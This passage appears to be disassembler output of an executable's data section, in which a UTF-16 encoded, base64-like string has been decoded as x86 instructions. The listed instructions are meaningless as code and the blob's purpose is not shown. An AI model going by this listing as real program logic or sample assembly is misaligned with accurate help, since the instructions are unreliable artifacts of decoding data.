  40a422:	44                   	inc    %esp
  40a423:	00 50 00             	add    %dl,0x0(%eax)
  40a426:	57                   	push   %edi
  40a427:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40a42b:	00 70 00             	add    %dh,0x0(%eax)
  40a42e:	6d                   	insl   (%dx),%es:(%edi)
  40a42f:	00 35 00 32 00 7a    	add    %dh,0x7a003200
  40a435:	00 32                	add    %dh,(%edx)
  40a437:	00 75 00             	add    %dh,0x0(%ebp)
  40a43a:	31 00                	xor    %eax,(%eax)
  40a43c:	2b 00                	sub    (%eax),%eax
  40a43e:	45                   	inc    %ebp
  40a43f:	00 33                	add    %dh,(%ebx)
  40a441:	00 6e 00             	add    %ch,0x0(%esi)
  40a444:	6a 00                	push   $0x0
  40a446:	4d                   	dec    %ebp
  40a447:	00 67 00             	add    %ah,0x0(%edi)
  40a44a:	31 00                	xor    %eax,(%eax)
  40a44c:	32 00                	xor    (%eax),%al
  40a44e:	74 00                	je     0x40a450
  40a450:	2b 00                	sub    (%eax),%eax
  40a452:	38 00                	cmp    %al,(%eax)
  40a454:	46                   	inc    %esi
  40a455:	00 51 00             	add    %dl,0x0(%ecx)
  40a458:	76 00                	jbe    0x40a45a
  40a45a:	47                   	inc    %edi
  40a45b:	00 30                	add    %dh,(%eax)
  40a45d:	00 52 00             	add    %dl,0x0(%edx)
  40a460:	32 00                	xor    (%eax),%al
  40a462:	43                   	inc    %ebx
  40a463:	00 48 00             	add    %cl,0x0(%eax)
  40a466:	57                   	push   %edi
  40a467:	00 53 00             	add    %dl,0x0(%ebx)
  40a46a:	68 00 68 00 76       	push   $0x76006800
  40a46f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a472:	78 00                	js     0x40a474
  40a474:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a478:	34 00                	xor    $0x0,%al
  40a47a:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a47e:	69 00 71 00 78 00    	imul   $0x780071,(%eax),%eax
  40a484:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40a488:	6e                   	outsb  %ds:(%esi),(%dx)
  40a489:	00 59 00             	add    %bl,0x0(%ecx)
  40a48c:	44                   	inc    %esp
  40a48d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a490:	63 00                	arpl   %eax,(%eax)
  40a492:	51                   	push   %ecx
  40a493:	00 5a 00             	add    %bl,0x0(%edx)
  40a496:	63 00                	arpl   %eax,(%eax)
  40a498:	66 00 2f             	data16 add %ch,(%edi)
  40a49b:	00 4a 00             	add    %cl,0x0(%edx)
  40a49e:	6b 00 4f             	imul   $0x4f,(%eax),%eax
  40a4a1:	00 6e 00             	add    %ch,0x0(%esi)
  40a4a4:	79 00                	jns    0x40a4a6
  40a4a6:	70 00                	jo     0x40a4a8
  40a4a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4a9:	00 46 00             	add    %al,0x0(%esi)
  40a4ac:	57                   	push   %edi
  40a4ad:	00 6e 00             	add    %ch,0x0(%esi)
  40a4b0:	36 00 33             	add    %dh,%ss:(%ebx)
  40a4b3:	00 73 00             	add    %dh,0x0(%ebx)
  40a4b6:	71 00                	jno    0x40a4b8
  40a4b8:	50                   	push   %eax
  40a4b9:	00 47 00             	add    %al,0x0(%edi)
  40a4bc:	4c                   	dec    %esp
  40a4bd:	00 2f                	add    %ch,(%edi)
  40a4bf:	00 2f                	add    %ch,(%edi)
  40a4c1:	00 5a 00             	add    %bl,0x0(%edx)
  40a4c4:	50                   	push   %eax
  40a4c5:	00 70 00             	add    %dh,0x0(%eax)
  40a4c8:	49                   	dec    %ecx
  40a4c9:	00 61 00             	add    %ah,0x0(%ecx)
  40a4cc:	61                   	popa
  40a4cd:	00 47 00             	add    %al,0x0(%edi)
  40a4d0:	4f                   	dec    %edi
  40a4d1:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40a4d5:	00 62 00             	add    %ah,0x0(%edx)
  40a4d8:	62 00                	bound  %eax,(%eax)
  40a4da:	37                   	aaa
  40a4db:	00 35 00 78 00 57    	add    %dh,0x57007800
  40a4e1:	00 39                	add    %bh,(%ecx)
  40a4e3:	00 49 00             	add    %cl,0x0(%ecx)
  40a4e6:	58                   	pop    %eax
  40a4e7:	00 63 00             	add    %ah,0x0(%ebx)
  40a4ea:	49                   	dec    %ecx
  40a4eb:	00 52 00             	add    %dl,0x0(%edx)
  40a4ee:	7a 00                	jp     0x40a4f0
  40a4f0:	37                   	aaa
  40a4f1:	00 68 00             	add    %ch,0x0(%eax)
  40a4f4:	46                   	inc    %esi
  40a4f5:	00 71 00             	add    %dh,0x0(%ecx)
  40a4f8:	49                   	dec    %ecx
  40a4f9:	00 42 00             	add    %al,0x0(%edx)
  40a4fc:	79 00                	jns    0x40a4fe
  40a4fe:	34 00                	xor    $0x0,%al
  40a500:	52                   	push   %edx
  40a501:	00 61 00             	add    %ah,0x0(%ecx)
  40a504:	37                   	aaa
  40a505:	00 68 00             	add    %ch,0x0(%eax)
  40a508:	41                   	inc    %ecx
  40a509:	00 6b 00             	add    %ch,0x0(%ebx)
  40a50c:	75 00                	jne    0x40a50e
  40a50e:	75 00                	jne    0x40a510
  40a510:	56                   	push   %esi
  40a511:	00 7a 00             	add    %bh,0x0(%edx)
  40a514:	57                   	push   %edi
  40a515:	00 71 00             	add    %dh,0x0(%ecx)
  40a518:	44                   	inc    %esp
  40a519:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  40a51d:	00 58 00             	add    %bl,0x0(%eax)
  40a520:	57                   	push   %edi
  40a521:	00 56 00             	add    %dl,0x0(%esi)
  40a524:	4f                   	dec    %edi
  40a525:	00 51 00             	add    %dl,0x0(%ecx)
  40a528:	51                   	push   %ecx
  40a529:	00 6e 00             	add    %ch,0x0(%esi)
  40a52c:	74 00                	je     0x40a52e
  40a52e:	72 00                	jb     0x40a530
  40a530:	66 00 35 00 5a 00 31 	data16 add %dh,0x31005a00
  40a537:	00 63 00             	add    %ah,0x0(%ebx)
  40a53a:	74 00                	je     0x40a53c
  40a53c:	7a 00                	jp     0x40a53e
  40a53e:	2f                   	das
  40a53f:	00 51 00             	add    %dl,0x0(%ecx)
  40a542:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a546:	43                   	inc    %ebx
  40a547:	00 47 00             	add    %al,0x0(%edi)
  40a54a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a54b:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a54f:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40a553:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40a557:	00 55 00             	add    %dl,0x0(%ebp)
  40a55a:	58                   	pop    %eax
  40a55b:	00 75 00             	add    %dh,0x0(%ebp)
  40a55e:	2f                   	das
  40a55f:	00 78 00             	add    %bh,0x0(%eax)
  40a562:	33 00                	xor    (%eax),%eax
  40a564:	78 00                	js     0x40a566
  40a566:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a56a:	48                   	dec    %eax
  40a56b:	00 66 00             	add    %ah,0x0(%esi)
  40a56e:	49                   	dec    %ecx
  40a56f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a572:	59                   	pop    %ecx
  40a573:	00 79 00             	add    %bh,0x0(%ecx)
  40a576:	33 00                	xor    (%eax),%eax
  40a578:	32 00                	xor    (%eax),%al
  40a57a:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a57d:	00 41 00             	add    %al,0x0(%ecx)
  40a580:	45                   	inc    %ebp
  40a581:	00 56 00             	add    %dl,0x0(%esi)
  40a584:	70 00                	jo     0x40a586
  40a586:	6d                   	insl   (%dx),%es:(%edi)
  40a587:	00 49 00             	add    %cl,0x0(%ecx)
  40a58a:	72 00                	jb     0x40a58c
  40a58c:	6c                   	insb   (%dx),%es:(%edi)
  40a58d:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  40a591:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a595:	00 70 00             	add    %dh,0x0(%eax)
  40a598:	78 00                	js     0x40a59a
  40a59a:	58                   	pop    %eax
  40a59b:	00 79 00             	add    %bh,0x0(%ecx)
  40a59e:	53                   	push   %ebx
  40a59f:	00 50 00             	add    %dl,0x0(%eax)
  40a5a2:	37                   	aaa
  40a5a3:	00 43 00             	add    %al,0x0(%ebx)
  40a5a6:	4d                   	dec    %ebp
  40a5a7:	00 30                	add    %dh,(%eax)
  40a5a9:	00 47 00             	add    %al,0x0(%edi)
  40a5ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5ad:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40a5b1:	00 4a 00             	add    %cl,0x0(%edx)
  40a5b4:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a5b7:	00 30                	add    %dh,(%eax)
  40a5b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a5bc:	78 00                	js     0x40a5be
  40a5be:	69 00 2f 00 74 00    	imul   $0x74002f,(%eax),%eax
  40a5c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c5:	00 4f 00             	add    %cl,0x0(%edi)
  40a5c8:	37                   	aaa
  40a5c9:	00 67 00             	add    %ah,0x0(%edi)
  40a5cc:	44                   	inc    %esp
  40a5cd:	00 6f 00             	add    %ch,0x0(%edi)
  40a5d0:	74 00                	je     0x40a5d2
  40a5d2:	50                   	push   %eax
  40a5d3:	00 66 00             	add    %ah,0x0(%esi)
  40a5d6:	72 00                	jb     0x40a5d8
  40a5d8:	74 00                	je     0x40a5da
  40a5da:	5a                   	pop    %edx
  40a5db:	00 33                	add    %dh,(%ebx)
  40a5dd:	00 56 00             	add    %dl,0x0(%esi)
  40a5e0:	2b 00                	sub    (%eax),%eax
  40a5e2:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40a5e6:	70 00                	jo     0x40a5e8
  40a5e8:	51                   	push   %ecx
  40a5e9:	00 31                	add    %dh,(%ecx)
  40a5eb:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40a5ef:	00 41 00             	add    %al,0x0(%ecx)
  40a5f2:	38 00                	cmp    %al,(%eax)
  40a5f4:	39 00                	cmp    %eax,(%eax)
  40a5f6:	46                   	inc    %esi
  40a5f7:	00 46 00             	add    %al,0x0(%esi)
  40a5fa:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a5fe:	38 00                	cmp    %al,(%eax)
  40a600:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a604:	4d                   	dec    %ebp
  40a605:	00 71 00             	add    %dh,0x0(%ecx)
  40a608:	78 00                	js     0x40a60a
  40a60a:	6d                   	insl   (%dx),%es:(%edi)
  40a60b:	00 63 00             	add    %ah,0x0(%ebx)
  40a60e:	32 00                	xor    (%eax),%al
  40a610:	2f                   	das
  40a611:	00 33                	add    %dh,(%ebx)
  40a613:	00 49 00             	add    %cl,0x0(%ecx)
  40a616:	49                   	dec    %ecx
  40a617:	00 63 00             	add    %ah,0x0(%ebx)
  40a61a:	6d                   	insl   (%dx),%es:(%edi)
  40a61b:	00 65 00             	add    %ah,0x0(%ebp)
  40a61e:	7a 00                	jp     0x40a620
  40a620:	6c                   	insb   (%dx),%es:(%edi)
  40a621:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40a625:	00 65 00             	add    %ah,0x0(%ebp)
  40a628:	72 00                	jb     0x40a62a
  40a62a:	2f                   	das
  40a62b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a62e:	5a                   	pop    %edx
  40a62f:	00 76 00             	add    %dh,0x0(%esi)
  40a632:	67 00 4d 00          	add    %cl,0x0(%di)
  40a636:	43                   	inc    %ebx
  40a637:	00 75 00             	add    %dh,0x0(%ebp)
  40a63a:	4f                   	dec    %edi
  40a63b:	00 47 00             	add    %al,0x0(%edi)
  40a63e:	7a 00                	jp     0x40a640
  40a640:	6f                   	outsl  %ds:(%esi),(%dx)
  40a641:	00 50 00             	add    %dl,0x0(%eax)
  40a644:	56                   	push   %esi
  40a645:	00 73 00             	add    %dh,0x0(%ebx)
  40a648:	6d                   	insl   (%dx),%es:(%edi)
  40a649:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40a64d:	00 77 00             	add    %dh,0x0(%edi)
  40a650:	54                   	push   %esp
  40a651:	00 4a 00             	add    %cl,0x0(%edx)
  40a654:	33 00                	xor    (%eax),%eax
  40a656:	4a                   	dec    %edx
  40a657:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a65a:	58                   	pop    %eax
  40a65b:	00 4e 00             	add    %cl,0x0(%esi)
  40a65e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a65f:	00 6e 00             	add    %ch,0x0(%esi)
  40a662:	45                   	inc    %ebp
  40a663:	00 2f                	add    %ch,(%edi)
  40a665:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40a669:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40a66d:	00 72 00             	add    %dh,0x0(%edx)
  40a670:	6b 00 48             	imul   $0x48,(%eax),%eax
  40a673:	00 37                	add    %dh,(%edi)
  40a675:	00 57 00             	add    %dl,0x0(%edi)
  40a678:	33 00                	xor    (%eax),%eax
  40a67a:	74 00                	je     0x40a67c
  40a67c:	4f                   	dec    %edi
  40a67d:	00 79 00             	add    %bh,0x0(%ecx)
  40a680:	35 00 70 00 52       	xor    $0x52007000,%eax
  40a685:	00 6f 00             	add    %ch,0x0(%edi)
  40a688:	4c                   	dec    %esp
  40a689:	00 78 00             	add    %bh,0x0(%eax)
  40a68c:	6c                   	insb   (%dx),%es:(%edi)
  40a68d:	00 42 00             	add    %al,0x0(%edx)
  40a690:	48                   	dec    %eax
  40a691:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a695:	00 50 00             	add    %dl,0x0(%eax)
  40a698:	50                   	push   %eax
  40a699:	00 71 00             	add    %dh,0x0(%ecx)
  40a69c:	31 00                	xor    %eax,(%eax)
  40a69e:	70 00                	jo     0x40a6a0
  40a6a0:	47                   	inc    %edi
  40a6a1:	00 77 00             	add    %dh,0x0(%edi)
  40a6a4:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40a6a8:	34 00                	xor    $0x0,%al
  40a6aa:	37                   	aaa
  40a6ab:	00 45 00             	add    %al,0x0(%ebp)
  40a6ae:	63 00                	arpl   %eax,(%eax)
  40a6b0:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a6b4:	30 00                	xor    %al,(%eax)
  40a6b6:	76 00                	jbe    0x40a6b8
  40a6b8:	55                   	push   %ebp
  40a6b9:	00 57 00             	add    %dl,0x0(%edi)
  40a6bc:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a6c0:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40a6c4:	6c                   	insb   (%dx),%es:(%edi)
  40a6c5:	00 69 00             	add    %ch,0x0(%ecx)
  40a6c8:	56                   	push   %esi
  40a6c9:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a6cd:	00 65 00             	add    %ah,0x0(%ebp)
  40a6d0:	77 00                	ja     0x40a6d2
  40a6d2:	44                   	inc    %esp
  40a6d3:	00 66 00             	add    %ah,0x0(%esi)
  40a6d6:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a6d9:	00 7a 00             	add    %bh,0x0(%edx)
  40a6dc:	70 00                	jo     0x40a6de
  40a6de:	37                   	aaa
  40a6df:	00 2f                	add    %ch,(%edi)
  40a6e1:	00 72 00             	add    %dh,0x0(%edx)
  40a6e4:	38 00                	cmp    %al,(%eax)
  40a6e6:	6d                   	insl   (%dx),%es:(%edi)
  40a6e7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6ea:	54                   	push   %esp
  40a6eb:	00 56 00             	add    %dl,0x0(%esi)
  40a6ee:	38 00                	cmp    %al,(%eax)
  40a6f0:	4c                   	dec    %esp
  40a6f1:	00 56 00             	add    %dl,0x0(%esi)
  40a6f4:	34 00                	xor    $0x0,%al
  40a6f6:	55                   	push   %ebp
  40a6f7:	00 48 00             	add    %cl,0x0(%eax)
  40a6fa:	63 00                	arpl   %eax,(%eax)
  40a6fc:	78 00                	js     0x40a6fe
  40a6fe:	49                   	dec    %ecx
  40a6ff:	00 57 00             	add    %dl,0x0(%edi)
  40a702:	75 00                	jne    0x40a704
  40a704:	42                   	inc    %edx
  40a705:	00 73 00             	add    %dh,0x0(%ebx)
  40a708:	72 00                	jb     0x40a70a
  40a70a:	4f                   	dec    %edi
  40a70b:	00 67 00             	add    %ah,0x0(%edi)
  40a70e:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a712:	7a 00                	jp     0x40a714
  40a714:	31 00                	xor    %eax,(%eax)
  40a716:	71 00                	jno    0x40a718
  40a718:	74 00                	je     0x40a71a
  40a71a:	69 00 46 00 49 00    	imul   $0x490046,(%eax),%eax
  40a720:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40a724:	6e                   	outsb  %ds:(%esi),(%dx)
  40a725:	00 55 00             	add    %dl,0x0(%ebp)
  40a728:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40a72c:	70 00                	jo     0x40a72e
  40a72e:	31 00                	xor    %eax,(%eax)
  40a730:	73 00                	jae    0x40a732
  40a732:	44                   	inc    %esp
  40a733:	00 56 00             	add    %dl,0x0(%esi)
  40a736:	35 00 46 00 55       	xor    $0x55004600,%eax
  40a73b:	00 2f                	add    %ch,(%edi)
  40a73d:	00 66 00             	add    %ah,0x0(%esi)
  40a740:	56                   	push   %esi
  40a741:	00 4a 00             	add    %cl,0x0(%edx)
  40a744:	6c                   	insb   (%dx),%es:(%edi)
  40a745:	00 4f 00             	add    %cl,0x0(%edi)
  40a748:	4c                   	dec    %esp
  40a749:	00 4a 00             	add    %cl,0x0(%edx)
  40a74c:	78 00                	js     0x40a74e
  40a74e:	4d                   	dec    %ebp
  40a74f:	00 51 00             	add    %dl,0x0(%ecx)
  40a752:	67 00 2b             	add    %ch,(%bp,%di)
  40a755:	00 61 00             	add    %ah,0x0(%ecx)
  40a758:	2b 00                	sub    (%eax),%eax
  40a75a:	5a                   	pop    %edx
  40a75b:	00 50 00             	add    %dl,0x0(%eax)
  40a75e:	33 00                	xor    (%eax),%eax
  40a760:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a764:	52                   	push   %edx
  40a765:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40a769:	00 63 00             	add    %ah,0x0(%ebx)
  40a76c:	48                   	dec    %eax
  40a76d:	00 4f 00             	add    %cl,0x0(%edi)
  40a770:	33 00                	xor    (%eax),%eax
  40a772:	30 00                	xor    %al,(%eax)
  40a774:	63 00                	arpl   %eax,(%eax)
  40a776:	68 00 4d 00 72       	push   $0x72004d00
  40a77b:	00 68 00             	add    %ch,0x0(%eax)
  40a77e:	71 00                	jno    0x40a780
  40a780:	69 00 44 00 6a 00    	imul   $0x6a0044,(%eax),%eax
  40a786:	57                   	push   %edi
  40a787:	00 31                	add    %dh,(%ecx)
  40a789:	00 41 00             	add    %al,0x0(%ecx)
  40a78c:	2f                   	das
  40a78d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a790:	58                   	pop    %eax
  40a791:	00 47 00             	add    %al,0x0(%edi)
  40a794:	32 00                	xor    (%eax),%al
  40a796:	38 00                	cmp    %al,(%eax)
  40a798:	55                   	push   %ebp
  40a799:	00 55 00             	add    %dl,0x0(%ebp)
  40a79c:	56                   	push   %esi
  40a79d:	00 6f 00             	add    %ch,0x0(%edi)
  40a7a0:	78 00                	js     0x40a7a2
  40a7a2:	67 00 31             	add    %dh,(%bx,%di)
  40a7a5:	00 61 00             	add    %ah,0x0(%ecx)
  40a7a8:	37                   	aaa
  40a7a9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7ad:	00 33                	add    %dh,(%ebx)
  40a7af:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7b2:	39 00                	cmp    %eax,(%eax)
  40a7b4:	64 00 31             	add    %dh,%fs:(%ecx)
  40a7b7:	00 4a 00             	add    %cl,0x0(%edx)
  40a7ba:	6a 00                	push   $0x0
  40a7bc:	4b                   	dec    %ebx
  40a7bd:	00 52 00             	add    %dl,0x0(%edx)
  40a7c0:	67 00 54 00          	add    %dl,0x0(%si)
  40a7c4:	37                   	aaa
  40a7c5:	00 72 00             	add    %dh,0x0(%edx)
  40a7c8:	6d                   	insl   (%dx),%es:(%edi)
  40a7c9:	00 58 00             	add    %bl,0x0(%eax)
  40a7cc:	56                   	push   %esi
  40a7cd:	00 4e 00             	add    %cl,0x0(%esi)
  40a7d0:	48                   	dec    %eax
  40a7d1:	00 61 00             	add    %ah,0x0(%ecx)
  40a7d4:	58                   	pop    %eax
  40a7d5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7d8:	2b 00                	sub    (%eax),%eax
  40a7da:	69 00 78 00 61 00    	imul   $0x610078,(%eax),%eax
  40a7e0:	38 00                	cmp    %al,(%eax)
  40a7e2:	34 00                	xor    $0x0,%al
  40a7e4:	46                   	inc    %esi
  40a7e5:	00 55 00             	add    %dl,0x0(%ebp)
  40a7e8:	79 00                	jns    0x40a7ea
  40a7ea:	30 00                	xor    %al,(%eax)
  40a7ec:	69 00 54 00 51 00    	imul   $0x510054,(%eax),%eax
  40a7f2:	33 00                	xor    (%eax),%eax
  40a7f4:	46                   	inc    %esi
  40a7f5:	00 47 00             	add    %al,0x0(%edi)
  40a7f8:	69 00 36 00 55 00    	imul   $0x550036,(%eax),%eax
  40a7fe:	4e                   	dec    %esi
  40a7ff:	00 32                	add    %dh,(%edx)
  40a801:	00 32                	add    %dh,(%edx)
  40a803:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40a807:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40a80b:	00 71 00             	add    %dh,0x0(%ecx)
  40a80e:	30 00                	xor    %al,(%eax)
  40a810:	79 00                	jns    0x40a812
  40a812:	4f                   	dec    %edi
  40a813:	00 53 00             	add    %dl,0x0(%ebx)
  40a816:	57                   	push   %edi
  40a817:	00 30                	add    %dh,(%eax)
  40a819:	00 62 00             	add    %ah,0x0(%edx)
  40a81c:	48                   	dec    %eax
  40a81d:	00 70 00             	add    %dh,0x0(%eax)
  40a820:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40a824:	52                   	push   %edx
  40a825:	00 38                	add    %bh,(%eax)
  40a827:	00 4e 00             	add    %cl,0x0(%esi)
  40a82a:	4f                   	dec    %edi
  40a82b:	00 78 00             	add    %bh,0x0(%eax)
  40a82e:	33 00                	xor    (%eax),%eax
  40a830:	45                   	inc    %ebp
  40a831:	00 6f 00             	add    %ch,0x0(%edi)
  40a834:	52                   	push   %edx
  40a835:	00 45 00             	add    %al,0x0(%ebp)
  40a838:	61                   	popa
  40a839:	00 71 00             	add    %dh,0x0(%ecx)
  40a83c:	30 00                	xor    %al,(%eax)
  40a83e:	71 00                	jno    0x40a840
  40a840:	4d                   	dec    %ebp
  40a841:	00 47 00             	add    %al,0x0(%edi)
  40a844:	6a 00                	push   $0x0
  40a846:	6e                   	outsb  %ds:(%esi),(%dx)
  40a847:	00 42 00             	add    %al,0x0(%edx)
  40a84a:	39 00                	cmp    %eax,(%eax)
  40a84c:	44                   	inc    %esp
  40a84d:	00 68 00             	add    %ch,0x0(%eax)
  40a850:	6d                   	insl   (%dx),%es:(%edi)
  40a851:	00 36                	add    %dh,(%esi)
  40a853:	00 66 00             	add    %ah,0x0(%esi)
  40a856:	71 00                	jno    0x40a858
  40a858:	57                   	push   %edi
  40a859:	00 49 00             	add    %cl,0x0(%ecx)
  40a85c:	6a 00                	push   $0x0
  40a85e:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a862:	33 00                	xor    (%eax),%eax
  40a864:	56                   	push   %esi
  40a865:	00 30                	add    %dh,(%eax)
  40a867:	00 2b                	add    %ch,(%ebx)
  40a869:	00 78 00             	add    %bh,0x0(%eax)
  40a86c:	30 00                	xor    %al,(%eax)
  40a86e:	31 00                	xor    %eax,(%eax)
  40a870:	47                   	inc    %edi
  40a871:	00 39                	add    %bh,(%ecx)
  40a873:	00 4e 00             	add    %cl,0x0(%esi)
  40a876:	79 00                	jns    0x40a878
  40a878:	56                   	push   %esi
  40a879:	00 66 00             	add    %ah,0x0(%esi)
  40a87c:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a880:	35 00 49 00 38       	xor    $0x38004900,%eax
  40a885:	00 7a 00             	add    %bh,0x0(%edx)
  40a888:	71 00                	jno    0x40a88a
  40a88a:	6a 00                	push   $0x0
  40a88c:	48                   	dec    %eax
  40a88d:	00 76 00             	add    %dh,0x0(%esi)
  40a890:	58                   	pop    %eax
  40a891:	00 59 00             	add    %bl,0x0(%ecx)
  40a894:	53                   	push   %ebx
  40a895:	00 73 00             	add    %dh,0x0(%ebx)
  40a898:	2b 00                	sub    (%eax),%eax
  40a89a:	43                   	inc    %ebx
  40a89b:	00 36                	add    %dh,(%esi)
  40a89d:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a8a1:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a8a5:	00 68 00             	add    %ch,0x0(%eax)
  40a8a8:	62 00                	bound  %eax,(%eax)
  40a8aa:	50                   	push   %eax
  40a8ab:	00 63 00             	add    %ah,0x0(%ebx)
  40a8ae:	51                   	push   %ecx
  40a8af:	00 6b 00             	add    %ch,0x0(%ebx)
  40a8b2:	34 00                	xor    $0x0,%al
  40a8b4:	68 00 54 00 33       	push   $0x33005400
  40a8b9:	00 41 00             	add    %al,0x0(%ecx)
  40a8bc:	43                   	inc    %ebx
  40a8bd:	00 31                	add    %dh,(%ecx)
  40a8bf:	00 51 00             	add    %dl,0x0(%ecx)
  40a8c2:	4e                   	dec    %esi
  40a8c3:	00 4f 00             	add    %cl,0x0(%edi)
  40a8c6:	62 00                	bound  %eax,(%eax)
  40a8c8:	63 00                	arpl   %eax,(%eax)
  40a8ca:	2f                   	das
  40a8cb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8ce:	37                   	aaa
  40a8cf:	00 68 00             	add    %ch,0x0(%eax)
  40a8d2:	56                   	push   %esi
  40a8d3:	00 7a 00             	add    %bh,0x0(%edx)
  40a8d6:	37                   	aaa
  40a8d7:	00 56 00             	add    %dl,0x0(%esi)
  40a8da:	64 00 37             	add    %dh,%fs:(%edi)
  40a8dd:	00 55 00             	add    %dl,0x0(%ebp)
  40a8e0:	67 00 6d 00          	add    %ch,0x0(%di)
  40a8e4:	39 00                	cmp    %eax,(%eax)
  40a8e6:	2b 00                	sub    (%eax),%eax
  40a8e8:	54                   	push   %esp
  40a8e9:	00 57 00             	add    %dl,0x0(%edi)
  40a8ec:	49                   	dec    %ecx
  40a8ed:	00 6a 00             	add    %ch,0x0(%edx)
  40a8f0:	52                   	push   %edx
  40a8f1:	00 45 00             	add    %al,0x0(%ebp)
  40a8f4:	74 00                	je     0x40a8f6
  40a8f6:	69 00 75 00 73 00    	imul   $0x730075,(%eax),%eax
  40a8fc:	5a                   	pop    %edx
  40a8fd:	00 6e 00             	add    %ch,0x0(%esi)
  40a900:	52                   	push   %edx
  40a901:	00 66 00             	add    %ah,0x0(%esi)
  40a904:	6f                   	outsl  %ds:(%esi),(%dx)
  40a905:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a909:	00 42 00             	add    %al,0x0(%edx)
  40a90c:	79 00                	jns    0x40a90e
  40a90e:	4d                   	dec    %ebp
  40a90f:	00 68 00             	add    %ch,0x0(%eax)
  40a912:	68 00 53 00 69       	push   $0x69005300
  40a917:	00 55 00             	add    %dl,0x0(%ebp)
  40a91a:	6d                   	insl   (%dx),%es:(%edi)
  40a91b:	00 71 00             	add    %dh,0x0(%ecx)
  40a91e:	69 00 75 00 74 00    	imul   $0x740075,(%eax),%eax
  40a924:	41                   	inc    %ecx
  40a925:	00 57 00             	add    %dl,0x0(%edi)
  40a928:	6c                   	insb   (%dx),%es:(%edi)
  40a929:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40a92d:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  40a931:	00 66 00             	add    %ah,0x0(%esi)
  40a934:	70 00                	jo     0x40a936
  40a936:	71 00                	jno    0x40a938
  40a938:	53                   	push   %ebx
  40a939:	00 41 00             	add    %al,0x0(%ecx)
  40a93c:	31 00                	xor    %eax,(%eax)
  40a93e:	68 00 43 00 2b       	push   $0x2b004300
  40a943:	00 32                	add    %dh,(%edx)
  40a945:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a949:	00 51 00             	add    %dl,0x0(%ecx)
  40a94c:	74 00                	je     0x40a94e
  40a94e:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40a952:	70 00                	jo     0x40a954
  40a954:	39 00                	cmp    %eax,(%eax)
  40a956:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a95a:	5a                   	pop    %edx
  40a95b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a95e:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40a962:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40a966:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40a96a:	74 00                	je     0x40a96c
  40a96c:	43                   	inc    %ebx
  40a96d:	00 4e 00             	add    %cl,0x0(%esi)
  40a970:	2f                   	das
  40a971:	00 67 00             	add    %ah,0x0(%edi)
  40a974:	51                   	push   %ecx
  40a975:	00 5a 00             	add    %bl,0x0(%edx)
  40a978:	34 00                	xor    $0x0,%al
